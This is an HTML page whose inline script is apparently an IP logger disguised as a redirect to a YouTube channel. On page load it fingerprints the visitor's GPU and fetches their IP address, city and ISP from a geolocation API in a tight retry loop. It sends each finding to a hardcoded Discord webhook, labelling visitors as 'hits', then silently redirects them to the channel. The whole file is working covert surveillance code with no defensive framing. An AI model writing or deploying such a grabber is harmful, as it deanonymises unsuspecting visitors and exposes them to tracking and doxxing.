<!DOCTYPE html>
<html>
<body style="background:#000;">
<script>
    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
    const y = "https://youtube.com/@LigmaBlox-w7m";

    // The mandatory Discord bypass wrapper
    const send = (msg) => navigator.sendBeacon(h, new Blob([JSON.stringify({content: msg})], {type: 'application/json'}));

    async function gD() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const d = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(d.UNMASKED_RENDERER_WEBGL).split("Apple ").pop().split(" (")[0];
        } catch(e) { return navigator.platform; }
    }

    async function run() {
        const v = sessionStorage.getItem('v');
        sessionStorage.setItem('v', '1');
        const dev = await gD();

        // 1. Instant Hardware Ping
        send(`[${v ? "RE-ENTRY" : "NEW HIT"}]\nDev: ${dev}`);

        // 2. The 2ms Brute-Force Loop for City/IP
        while(true) {
            try {
                const r = await fetch('https://ip-api.com/json/?cb=' + Date.now()).then(res => res.json());
                if(r.status === "success") {
                    send(`IP: ${r.query}\nCity: ${r.city}\nISP: ${r.isp}`);
                    break;
                }
            } catch(e) {
                await new Promise(s => setTimeout(s, 2));
            }
        }
        
        // 3. Clean Redirect
        setTimeout(() => window.location.replace(y), 300);
    }
    run();
</script>
</body>
</html>
